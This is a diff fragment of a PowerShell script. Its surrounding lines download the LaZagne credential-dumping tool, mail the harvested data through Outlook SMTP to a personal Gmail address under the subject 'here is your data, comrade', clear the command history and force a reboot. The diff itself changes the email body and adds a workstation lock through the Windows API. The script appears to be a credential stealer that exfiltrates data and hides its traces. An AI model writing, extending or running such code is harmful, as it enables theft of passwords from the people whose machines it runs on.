@@ -102,7 +102,7 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 $EmailFrom = "HerbertSwindel@outlook.com"
 $EmailTo = "herbertswindel@gmail.com"
 $Subject = "Hier zijn uw gegevens kameraad!"
-$Body = "Hier zijn uw gegevens kameraad!"
+$Body = "Met vriendelijke groet, Herbert"
 $SMTPServer = "smtp.outlook.com"
 
 $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
@@ -134,4 +134,17 @@ Restart-Computer -Force
 Clear-History
 
 # Reboot the system
-Restart-Computer -Force
+# Define the constant values from the Windows API
+$WinAPI = Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class WinAPI {
+    [DllImport("user32.dll")]
+    public static extern void LockWorkStation();
+}
+"@
+
+# Call the LockWorkStation function to lock the computer
+[WinAPI]::LockWorkStation()
+
